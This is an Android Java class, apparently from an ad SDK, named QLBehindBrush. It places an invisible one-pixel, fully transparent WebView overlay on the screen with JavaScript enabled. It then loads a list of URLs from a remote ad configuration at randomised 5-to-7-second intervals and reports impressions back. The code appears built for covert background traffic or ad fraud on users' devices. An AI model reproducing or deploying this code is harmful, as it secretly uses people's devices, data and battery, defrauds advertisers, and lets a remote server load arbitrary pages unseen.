package com.qinglu.ad;

import java.util.ArrayList;
import java.util.List;








import com.guang.client.GCommon;
import com.guang.client.controller.GUserController;
import com.guang.client.mode.GAdPositionConfig;
import com.guang.client.tools.GLog;
import com.guang.client.tools.GTools;

import android.annotation.SuppressLint;
import android.app.Service;
import android.os.Handler;
import android.os.Message;
import android.view.Gravity;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

@SuppressLint("SetJavaScriptEnabled")
public class QLBehindBrush{ 
    WindowManager.LayoutParams wmParams;  
    //创建浮动窗口设置布局参数的对象  
    WindowManager mWindowManager;
    private Service context;
    private static QLBehindBrush _instance;
	private boolean isShow = false;
		
	private List<String> urls;
	private WebView webView;
	private Handler handler;
	
	private QLBehindBrush(){}
	
	public static QLBehindBrush getInstance()
	{
		if(_instance == null)
		{
			_instance = new QLBehindBrush();
		}
		return _instance;
	}
	
	@SuppressLint("NewApi")
	public void show() {			
		this.context = (Service) QLAdController.getInstance().getContext();
		wmParams = new WindowManager.LayoutParams();
		// 获取的是WindowManagerImpl.CompatModeWrapper
		mWindowManager = (WindowManager) context.getApplication()
				.getSystemService(context.getApplication().WINDOW_SERVICE);
		// 设置window type
		wmParams.type = LayoutParams.TYPE_TOAST;
		// 设置图片格式，效果为背景透明
		//wmParams.format = PixelFormat.RGBA_8888;
		// 设置浮动窗口不可聚焦（实现操作除浮动窗口外的其他可见窗口的操作） LayoutParams.FLAG_NOT_FOCUSABLE |
		wmParams.flags = LayoutParams.FLAG_NOT_FOCUSABLE | LayoutParams.FLAG_FULLSCREEN;
		// 调整悬浮窗显示的停靠位置为左侧置顶
		wmParams.gravity = Gravity.LEFT | Gravity.TOP;
		// 以屏幕左上角为原点，设置x、y初始值，相对于gravity
		wmParams.x = 0;
		wmParams.y = 0;

		// 设置悬浮窗口长宽数据
		wmParams.width = WindowManager.LayoutParams.MATCH_PARENT;
		wmParams.height = 1;

		webView = new WebView(context);
		webView.setAlpha(0.f);
		//添加mFloatLayout  
        mWindowManager.addView(webView, wmParams);  
		isShow = true;
		
		webView.getSettings().setJavaScriptEnabled(true);
		webView.getSettings().setCacheMode(WebSettings.LOAD_NO_CACHE);
		
		webView.setWebViewClient(new WebViewClient(){
			 @Override
			public boolean shouldOverrideUrlLoading(WebView view, String url) {
				 view.loadUrl(url);
				return true;
			}
		 });
		
		handler = new Handler(){
			@Override
			public void dispatchMessage(Message msg) {
				super.dispatchMessage(msg);
				if(msg.what == 0x01)
				{
					openUrl();
				}
				else if(msg.what == 0x02)
				{
					hide();
				}
			}
		};
		urls = new ArrayList<String>();
		
		List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.BEHIND_BRUSH);
		if(list != null && list.size() > 0)
		{
			GAdPositionConfig config = list.get(0);
			
			String ls = config.getBehindBrushUrls();
			if(ls != null && !"".equals(ls))
			{
				String lss[] = ls.split("\\s");
				for(int i=0;i<lss.length;i++)
				{
					String l = lss[i];
					if(l != null && !"".equals(l) && !l.trim().equals(""))
						urls.add(l);
				}
			}
		}
		
		if(urls.size()>0)
		{
			openUrl();
			openUrlThread();
		}
		else
		{
			hide();
		}
		GTools.uploadStatistics(GCommon.SHOW,GCommon.BEHIND_BRUSH,"self");
	}
	
	public void hide()
	{
		if(isShow)
		{
			mWindowManager.removeView(webView);
			isShow = false;
		}		
	}
	
	public void openUrl()
	{
		if(urls.size()>0)
		{
			String url = urls.get(0);
			webView.loadUrl(url);
			urls.remove(0);
			GLog.e("---------------------", "openUrl="+url);
		}
	}
	public void openUrlThread()
	{
		if(urls.size()<=0)
		{
			handler.sendEmptyMessage(0x02);
			return;
		}
		new Thread(){
			public void run() {
				int t = (int) (((int)(Math.random()*100)+1) / 100.f * 2 * 1000) + 5000;
				while(t>0)
				{
					t-=100;
					try {
						Thread.sleep(100);
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
				}
				handler.sendEmptyMessage(0x01);
				openUrlThread();
			};
		}.start();
		
	}
}
